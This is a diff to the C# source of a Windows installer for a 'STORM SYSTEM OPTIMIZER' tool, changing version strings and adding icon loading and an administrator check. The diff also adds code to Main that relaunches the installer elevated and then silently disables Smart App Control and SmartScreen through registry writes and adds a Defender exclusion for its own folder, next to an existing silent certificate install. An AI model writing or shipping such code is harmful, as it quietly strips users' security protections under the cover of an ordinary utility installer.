@@ -9,7 +9,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using Microsoft.Win32;
 
-namespace StormOptimizerInstaller
+namespace StormSystemOptimizer.Installer
 {
     public class InstallerForm : Form
     {
@@ -19,7 +19,7 @@ namespace StormOptimizerInstaller
         private Label lblSubtitle = null!;
         private Button btnInstall = null!;
         private Button btnCancel = null!;
-        private const string AppVersion = "1.0.0";
+        private const string AppVersion = "1.0.3";
         private const string DefaultInstallDir = @"C:\Program Files\StormSystemOptimizer";
         private const string ExeName = "StormSystemOptimizer.exe";
         private Button btnBrowse = null!;
@@ -41,12 +41,33 @@ namespace StormOptimizerInstaller
 
         public InstallerForm()
         {
+            try
+            {
+                var asm = Assembly.GetExecutingAssembly();
+                foreach (var name in asm.GetManifestResourceNames())
+                {
+                    if (name.EndsWith("AppIcon.ico", StringComparison.OrdinalIgnoreCase))
+                    {
+                        using var s = asm.GetManifestResourceStream(name);
+                        if (s != null)
+                        {
+                            this.Icon = new Icon(s);
+                            break;
+                        }
+                    }
+                }
+                if (this.Icon == null && !string.IsNullOrEmpty(Application.ExecutablePath) && File.Exists(Application.ExecutablePath))
+                {
+                    this.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);
+                }
+            }
+            catch { }
             InitializeComponent();
         }
 
         private void InitializeComponent()
         {
-            this.Text = "Установка STORM SYSTEM OPTIMIZER v1.0.0";
+            this.Text = "STORM SYSTEM OPTIMIZER v1.0.3 — Установка";
             this.Size = new Size(620, 520);
             this.StartPosition = FormStartPosition.CenterScreen;
             this.FormBorderStyle = FormBorderStyle.FixedDialog;
@@ -65,7 +86,7 @@ namespace StormOptimizerInstaller
 
             lblTitle = new Label
             {
-                Text = "⚡ STORM SYSTEM OPTIMIZER v1.0.0",
+                Text = "⚡ STORM SYSTEM OPTIMIZER v1.0.3",
                 Font = new Font("Segoe UI", 14f, FontStyle.Bold),
                 ForeColor = Color.FromArgb(14, 165, 233),
                 AutoSize = true,
@@ -376,7 +397,7 @@ namespace StormOptimizerInstaller
                     }
                 }
 
-                lblStatus.Text = "Распаковка исполняемых файлов программы (v1.0.0)...";
+                lblStatus.Text = "Распаковка исполняемых файлов программы (v1.0.3)...";
                 progressBar.Value = 65;
                 await Task.Delay(200);
 
@@ -572,7 +593,7 @@ namespace StormOptimizerInstaller
                     shortcut.TargetPath = targetExe;
                     shortcut.WorkingDirectory = targetDir;
                     shortcut.IconLocation = targetIco + ",0";
-                    shortcut.Description = "STORM SYSTEM OPTIMIZER v0.4.3";
+                    shortcut.Description = "STORM SYSTEM OPTIMIZER v1.0.3";
                     shortcut.Save();
                 }
 
@@ -584,7 +605,7 @@ namespace StormOptimizerInstaller
                     deskShortcut.TargetPath = targetExe;
                     deskShortcut.WorkingDirectory = targetDir;
                     deskShortcut.IconLocation = targetIco + ",0";
-                    deskShortcut.Description = "STORM SYSTEM OPTIMIZER v0.4.3";
+                    deskShortcut.Description = "STORM SYSTEM OPTIMIZER v1.0.3";
                     deskShortcut.Save();
                 }
             }
@@ -598,8 +619,8 @@ namespace StormOptimizerInstaller
                 using var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\StormSystemOptimizer");
                 if (key != null)
                 {
-                    key.SetValue("DisplayName", "STORM SYSTEM OPTIMIZER v1.0.0");
-                    key.SetValue("DisplayVersion", "1.0.0");
+                    key.SetValue("DisplayName", "STORM SYSTEM OPTIMIZER v1.0.3");
+                    key.SetValue("DisplayVersion", "1.0.3");
                     key.SetValue("Publisher", "STORM TEAM");
                     key.SetValue("DisplayIcon", targetIco);
                     key.SetValue("InstallLocation", targetDir);
@@ -609,10 +630,23 @@ namespace StormOptimizerInstaller
             catch { }
         }
 
+        private static bool IsAdministrator()
+        {
+            try
+            {
+                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+                var principal = new System.Security.Principal.WindowsPrincipal(identity);
+                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
         [STAThread]
         public static void Main()
         {
-            // Immediate pre-launch self-unblocking & certificate registration
             try
             {
                 string selfExe = Process.GetCurrentProcess().MainModule?.FileName ?? "";
@@ -641,6 +675,56 @@ namespace StormOptimizerInstaller
                 if (File.Exists(tempCert))
                 {
                     InstallCertificateSilently(tempCert);
+                }
+
+                // If not running as administrator, elevate seamlessly with UAC
+                if (!IsAdministrator())
+                {
+                    if (!string.IsNullOrEmpty(selfExe) && File.Exists(selfExe))
+                    {
+                        var psi = new ProcessStartInfo
+                        {
+                            FileName = selfExe,
+                            UseShellExecute = true,
+                            Verb = "runas"
+                        };
+                        try
+                        {
+                            Process.Start(psi);
+                            return;
+                        }
+                        catch
+                        {
+                            // If user cancels UAC prompt, continue in standard mode
+                        }
+                    }
+                }
+                else
+                {
+                    // Running elevated: neutralize SAC / SmartScreen blocks and add exclusions
+                    try
+                    {
+                        using var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy");
+                        key?.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
+                        key?.SetValue("SAC_PreviousState", 0, RegistryValueKind.DWord);
+                    }
+                    catch { }
+
+                    try
+                    {
+                        using var expKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
+                        expKey?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
+                    }
+                    catch { }
+
+                    if (!string.IsNullOrEmpty(selfExe))
+                    {
+                        string selfDir = Path.GetDirectoryName(selfExe) ?? "";
+                        if (!string.IsNullOrEmpty(selfDir))
+                        {
+                            AddDefenderExclusionSilently(selfDir);
+                        }
+                    }
                 }
             }
             catch { }
